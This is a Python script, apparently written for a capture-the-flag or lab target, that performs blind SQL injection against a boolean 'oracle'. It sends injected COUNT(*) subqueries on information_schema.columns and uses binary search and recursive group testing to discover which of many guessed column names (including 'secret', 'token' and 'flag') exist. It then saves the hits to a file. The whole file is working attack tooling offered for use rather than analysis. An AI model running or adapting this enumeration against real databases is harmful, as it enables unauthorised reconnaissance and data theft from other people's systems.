"""Group testing: identify which candidate column names exist, using the count
returned by one query to split the candidate list recursively.

One /probe answer is 1 bit, but `COUNT(*) ... IN (set)` answers "how many of this set
match", which is log2(k+1) bits at once -- far cheaper than one query per name.
"""
import sys
import time
from oracle import ask

GAP = 2.0
CANDS = sorted(set("""id name designation planet planets telemetry signature sig data payload value val
content blob bytea bin raw note notes text body msg message description desc class type kind category
status state level rank clearance secret hidden private internal restricted flag flags token key keys
code hash digest mac checksum meta extra info detail details x a b c k v w s t u col column attr field
prop property item entry record row doc docu file path link url uri src source origin author owner
created updated time stamp date year orbit distance mass radius gravity atmosphere spectral discovered
temp temperature luminosity habitable zone band signal carrier wave freq frequency amplitude power
leak leaks zleak omega alpha beta gamma delta epsilon probe probe_id probeid pid target query input
""".split()))
WHERE = "table_schema='public'"


def cnt(where, names):
    """Exact number of columns in `names` matching `where` (0..len)."""
    if not names:
        return 0
    inlist = ",".join("'%s'" % n for n in names)
    e = "(SELECT COUNT(*) FROM information_schema.columns WHERE %s AND column_name IN (%s))" % (where, inlist)
    lo, hi = 0, len(names)
    while lo < hi:
        mid = (lo + hi + 1) // 2
        time.sleep(GAP)
        if _bit("(%s)>=%d" % (e, mid)):
            lo = mid
        else:
            hi = mid - 1
    return lo


def _bit(e, tries=3):
    for _ in range(tries):
        if ask(e):
            return True
        time.sleep(1.5)
    return False


def find(where, names, want, depth=0):
    """Return up to `want` column names from `names` that match `where`."""
    if not names or want <= 0:
        return []
    n = cnt(where, names)
    pad = "  " * depth
    sys.stdout.write("\r%sset=%d hits=%d   " % (pad, len(names), n))
    sys.stdout.flush()
    if n == 0:
        return []
    if len(names) == 1:
        return names if n else []
    half = len(names) // 2
    left, right = names[:half], names[half:]
    l = find(where, left, min(n, want), depth + 1)
    if len(l) < n:
        l += find(where, right, n - len(l), depth + 1)
    return l


if __name__ == "__main__":
    total = cnt(WHERE, ["id"])  # warm-up sanity
    allc = cnt(WHERE, CANDS)
    print("\n[*] public columns among the %d candidates: %d" % (len(CANDS), allc))
    tot = _bit("(SELECT COUNT(*) FROM information_schema.columns WHERE %s)>=1" % WHERE)
    print("[*] any public columns at all: %s" % tot)
    hits = find(WHERE, CANDS, allc)
    print("\n[+] matched column names: %s" % sorted(hits))
    open("cols_public.txt", "w").write("\n".join(sorted(hits)) + "\n")
